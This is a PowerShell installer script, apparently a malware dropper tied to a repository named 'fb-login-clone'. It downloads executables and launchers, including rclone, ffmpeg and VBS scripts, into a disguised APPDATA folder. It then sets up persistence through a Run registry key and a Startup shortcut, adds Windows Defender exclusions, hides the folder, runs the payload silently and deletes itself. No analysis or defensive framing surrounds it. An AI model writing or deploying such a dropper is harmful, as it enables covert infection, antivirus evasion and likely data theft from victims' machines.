# setup.ps1

$dest = "$env:APPDATA\Microsoft\Windows\luna"
$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/luna"
$files = @("luna.ps1", "luna_launcher.bat" "rclone.exe", "rclone.conf", "ffmpeg.exe", "setup.vbs" "luna_launcher.vbs")

# 
New-Item -ItemType Directory -Path $dest -Force | Out-Null

# 
foreach ($file in $files) {
    try {
        Invoke-WebRequest -Uri "$repo/$file" -OutFile "$dest\$file" -UseBasicParsing
        Write-Host "Downloaded $file"
    } catch {
        Write-Warning "Failed to download $file"
    }
}

#
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "luna" -Value "$dest\luna_launcher.vbs"

#
$WshShell = New-Object -ComObject WScript.Shell
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\luna.lnk"
$shortcut = $WshShell.CreateShortcut($lnkPath)
$shortcut.TargetPath = "$dest\luna_launcher.vbs"
$shortcut.WorkingDirectory = $dest
$shortcut.Save()

#
Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "$dest\luna.ps1" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionProcess "$dest\luna_launcher.vbs" -ErrorAction SilentlyContinue

#
try {
    (Get-Item $dest).Attributes += 'Hidden'
} catch {}

#
Start-Process -WindowStyle Hidden -FilePath "$dest\luna_launcher.vbs"

#
$me = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 2
Remove-Item $me -Force -ErrorAction SilentlyContinue